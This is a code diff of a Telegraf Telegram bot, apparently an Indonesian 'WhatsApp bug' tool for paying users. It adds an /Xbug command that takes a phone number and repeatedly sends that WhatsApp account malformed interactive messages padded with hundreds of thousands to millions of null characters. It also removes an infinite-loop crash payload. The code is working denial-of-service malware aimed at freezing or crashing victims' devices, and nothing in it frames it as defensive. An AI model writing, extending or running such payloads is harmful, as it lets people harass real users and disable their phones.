@@ -1331,7 +1331,8 @@ async function showxbugs(ctx, page = 1) {
 ◇ Language  : JavaScript
 ◇ Framework : Telegraf
 <blockquote>☾. ⬡═―⊱「 🚀 DELAY TYPE 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-◇ /Xdelay   62xxx  → Delay Can Spam
+◇ /Xdelay   62xxx  → Delay Hard Visible
+◇ /Xbug    62xxx  → Invisible Delay
 
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
@@ -2272,69 +2273,35 @@ bot.command("Xdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, a
 
   (async () => {
     for (let r = 0; r < 3; r++) {
-  await InvisDelaySqlVnX(sock, target true);
-  await sleep(800);  
   await delayHold(sock, target);
   await sleep(1000); 
   await ArtGuarfian(sock, target);
   await sleep(1000);
   await ArTdElay(sock, target);
-  await sleep(2500)!
+  await sleep(2500);
+}
+  })();
+});
+/// ============= CASE BUG 2 BEBAS SPAM=============\\\
+bot.command("Xbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
+  
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /Xbug 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(`<blockquote>🧨 𝐗𝐛𝐮𝐠  (𝐛𝐮𝐠)  𝐬𝐞𝐥𝐞𝐬𝐚𝐢 𝐝𝐢𝐤𝐢𝐫𝐢𝐦 𝐮𝐧𝐭𝐮𝐤 ${q}</blockquote>`);
+
+  (async () => {
+    for (let r = 0; r < 10; r++) {
+  await VnXDelayHardSw(sock, target);
+  await sleep(900);
+  await DelayHardNullVnX(sock, target);
+  await sleep(1000);
 }
   })();
 });
 // ------------ (  FUNCTION BUGS ) -------------- \\
-async function InvisDelaySqlVnX(sock, target) {
-  while (true) {
-    try {
-     const msgvnx = await generateWAMessageFromContent(
-      target,
-       {
-        groupStatusMessageV2: {
-            message: {     
-         interactiveResponseMessage: {
-           body: {
-             text: "\x10.VnX",
-             format: "DEFAULT"
-           },
-          nativeFlowResponseMessage: {
-           name: "galaxy_message",
-           paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
-           version: 3
-          },
-          contextInfo: {
-            remoteJid: null,
-            statusAttributionType: 2,
-                 statusAttributions: Array.from({ length: 209990 }, (_, z) => ({
-                  type: 1
-                }))  
-              }
-             }
-            }
-          }
-        },
-      { userJid: sock.user.id } 
-    );
-        
-      await sock.relayMessage(
-          target,
-          msgvnx.message,
-           {
-            messageId: msgvnx.key.id,
-            participant: { jid: target }
-           }
-         );
-         console.log(`👻 GXION SENDING BUGS TO ${target} (Looping Active)`);
-
-         await new Promise(resolve => setTimeout(resolve, 1000));
-
-        } catch (err) {
-            console.error("❌ Error dalam Loop:", err);
-            await new Promise(resolve => setTimeout(resolve, 5000));
-        }
-    }
-}
-
 async function delayHold(sock, target) {
   const msg = {
     interactiveResponseMessage: {
@@ -2504,6 +2471,81 @@ async function ArTdElay(sock, target) {
   });
   await new Promise(resolve => setTimeout(resolve, 5000));
 }
+
+async function VnXDelayHardSw(sock, target) {
+  const msgsw = await generateWAMessageFromContent(target, {
+     viewOnceMessage: {
+       message: {   
+        interactiveResponseMessage: {
+          body: {
+            text: "VnX Sw  Nihk",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\u0000".repeat(2248100),
+            version: 3
+           }
+         }
+       }
+     }
+   }, {});
+
+  await sock.relayMessage("status@broadcast", msgsw.message, {
+    messageId: msgsw.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: {
+                  jid: target
+                },
+                content: undefined
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+}
+
+async function DelayHardNullVnX(sock, target, ptcp = true) {
+ 
+    let msg = await generateWAMessageFromContent(target, {
+        interactiveResponseMessage: {
+            body: {
+                text: "VnX",
+                format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+                name: "galaxy_message",
+                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
+                version: 3
+            }
+        }
+    }, { userJid: sock.user.id });
+
+    await sock.relayMessage(target, {
+        viewOnceMessage: {
+            message: msg.message
+        }
+    }, ptcp ? { 
+        messageId: msg.key.id, 
+        participant: { jid: target } 
+    } : { 
+        messageId: msg.key.id 
+    });
+}
+
 // --- Jalankan Bot --- //
 (async () => {
   try {
